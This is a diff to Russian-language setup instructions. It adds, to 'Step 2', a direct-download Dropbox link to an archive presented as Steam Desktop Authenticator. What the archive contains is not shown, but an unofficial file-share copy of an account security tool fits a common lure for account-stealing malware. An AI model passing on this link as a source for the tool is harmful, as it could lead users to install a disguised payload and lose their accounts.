@@ -17,7 +17,7 @@
 
 Шаг 2 📥
 
-Как только выполнили расширение, загрузите Steam Desktop Authenticator
+Как только выполнили расширение, загрузите [Steam Desktop Authenticator](https://www.dropbox.com/scl/fi/w5ecd2o303ev2ijyhou1k/SDA-Release.rar?rlkey=67qirl78067s116b9nzm9ju9u&dl=1)
 
 Шаг 3 📂
 
